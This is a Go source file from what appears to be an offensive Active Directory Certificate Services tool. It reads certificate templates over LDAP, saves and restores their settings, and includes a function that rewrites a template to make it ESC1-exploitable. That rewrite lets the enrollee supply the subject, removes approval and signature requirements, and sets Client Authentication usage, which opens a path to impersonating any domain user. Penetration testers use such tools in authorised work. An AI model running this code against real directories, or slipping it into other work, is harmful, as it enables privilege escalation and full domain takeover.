package adcs

import (
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/go-ldap/ldap/v3"
	"github.com/slacker/goertipy/pkg/adcs/flags"
	goertipyldap "github.com/slacker/goertipy/pkg/ldap"
)

// TemplateConfig holds the saved template configuration for backup/restore
type TemplateConfig struct {
	TemplateName        string   `json:"template_name"`
	DN                  string   `json:"dn"`
	Timestamp           string   `json:"timestamp"`
	CertificateNameFlag string   `json:"msPKI-Certificate-Name-Flag"`
	EnrollmentFlag      string   `json:"msPKI-Enrollment-Flag"`
	RASignature         string   `json:"msPKI-RA-Signature"`
	ExtendedKeyUsage    []string `json:"pKIExtendedKeyUsage"`
	ApplicationPolicies []string `json:"msPKI-Certificate-Application-Policy,omitempty"`
}

// GetTemplateByName fetches a single certificate template by cn
func GetTemplateByName(client *goertipyldap.Client, name string) (*CertificateTemplate, error) {
	baseDN := fmt.Sprintf("CN=Certificate Templates,CN=Public Key Services,CN=Services,%s",
		client.ConfigurationNC())

	attributes := []string{
		"cn",
		"displayName",
		"distinguishedName",
		"msPKI-Certificate-Name-Flag",
		"msPKI-Enrollment-Flag",
		"msPKI-Private-Key-Flag",
		"msPKI-RA-Signature",
		"msPKI-RA-Policies",
		"pKIExtendedKeyUsage",
		"msPKI-Certificate-Application-Policy",
		"pKIExpirationPeriod",
		"pKIOverlapPeriod",
		"nTSecurityDescriptor",
		"msPKI-Cert-Template-OID",
		"msPKI-Template-Schema-Version",
	}

	filter := fmt.Sprintf("(&(objectClass=pKICertificateTemplate)(cn=%s))",
		ldap.EscapeFilter(name))

	entry, err := client.SearchOne(baseDN, ldap.ScopeWholeSubtree, filter, attributes)
	if err != nil {
		return nil, fmt.Errorf("failed to search for template: %w", err)
	}
	if entry == nil {
		return nil, fmt.Errorf("template %q not found", name)
	}

	return parseTemplateEntry(entry), nil
}

// SaveTemplateConfig saves the current template configuration to a JSON file
func SaveTemplateConfig(tmpl *CertificateTemplate, path string) error {
	config := &TemplateConfig{
		TemplateName:        tmpl.Name,
		DN:                  tmpl.DN,
		Timestamp:           time.Now().UTC().Format(time.RFC3339),
		CertificateNameFlag: strconv.FormatUint(uint64(tmpl.CertificateNameFlag), 10),
		EnrollmentFlag:      strconv.FormatUint(uint64(tmpl.EnrollmentFlag), 10),
		RASignature:         strconv.Itoa(tmpl.RASignature),
		ExtendedKeyUsage:    tmpl.ExtendedKeyUsage,
		ApplicationPolicies: tmpl.ApplicationPolicies,
	}

	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal config: %w", err)
	}

	if err := os.WriteFile(path, data, 0600); err != nil {
		return fmt.Errorf("failed to write backup: %w", err)
	}

	return nil
}

// LoadTemplateConfig loads a template configuration from a JSON file
func LoadTemplateConfig(path string) (*TemplateConfig, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("failed to read backup: %w", err)
	}

	var config TemplateConfig
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, fmt.Errorf("failed to parse backup: %w", err)
	}

	if config.DN == "" || config.TemplateName == "" {
		return nil, fmt.Errorf("invalid backup file: missing DN or template name")
	}

	return &config, nil
}

// ModifyTemplateForESC1 modifies a template to be ESC1-exploitable:
//   - Sets CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT in msPKI-Certificate-Name-Flag
//   - Clears CT_FLAG_PEND_ALL_REQUESTS from msPKI-Enrollment-Flag
//   - Sets msPKI-RA-Signature to 0
//   - Sets pKIExtendedKeyUsage to Client Authentication
func ModifyTemplateForESC1(client *goertipyldap.Client, tmpl *CertificateTemplate) error {
	// Compute new flag values
	newNameFlag := tmpl.CertificateNameFlag | flags.CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
	newEnrollFlag := tmpl.EnrollmentFlag &^ flags.CT_FLAG_PEND_ALL_REQUESTS

	mods := []ldap.Change{
		{
			Operation: ldap.ReplaceAttribute,
			Modification: ldap.PartialAttribute{
				Type: "msPKI-Certificate-Name-Flag",
				Vals: []string{strconv.FormatInt(int64(int32(newNameFlag)), 10)},
			},
		},
		{
			Operation: ldap.ReplaceAttribute,
			Modification: ldap.PartialAttribute{
				Type: "msPKI-Enrollment-Flag",
				Vals: []string{strconv.FormatInt(int64(int32(newEnrollFlag)), 10)},
			},
		},
		{
			Operation: ldap.ReplaceAttribute,
			Modification: ldap.PartialAttribute{
				Type: "msPKI-RA-Signature",
				Vals: []string{"0"},
			},
		},
		{
			Operation: ldap.ReplaceAttribute,
			Modification: ldap.PartialAttribute{
				Type: "pKIExtendedKeyUsage",
				Vals: []string{flags.EKU_CLIENT_AUTH},
			},
		},
	}

	if err := client.ModifyAttribute(tmpl.DN, mods); err != nil {
		return fmt.Errorf("failed to modify template %q: %w", tmpl.Name, err)
	}

	return nil
}

// RestoreTemplate restores a template to its original configuration from backup
func RestoreTemplate(client *goertipyldap.Client, config *TemplateConfig) error {
	mods := []ldap.Change{
		{
			Operation: ldap.ReplaceAttribute,
			Modification: ldap.PartialAttribute{
				Type: "msPKI-Certificate-Name-Flag",
				Vals: []string{config.CertificateNameFlag},
			},
		},
		{
			Operation: ldap.ReplaceAttribute,
			Modification: ldap.PartialAttribute{
				Type: "msPKI-Enrollment-Flag",
				Vals: []string{config.EnrollmentFlag},
			},
		},
		{
			Operation: ldap.ReplaceAttribute,
			Modification: ldap.PartialAttribute{
				Type: "msPKI-RA-Signature",
				Vals: []string{config.RASignature},
			},
		},
		{
			Operation: ldap.ReplaceAttribute,
			Modification: ldap.PartialAttribute{
				Type: "pKIExtendedKeyUsage",
				Vals: config.ExtendedKeyUsage,
			},
		},
	}

	if err := client.ModifyAttribute(config.DN, mods); err != nil {
		return fmt.Errorf("failed to restore template %q: %w", config.TemplateName, err)
	}

	return nil
}
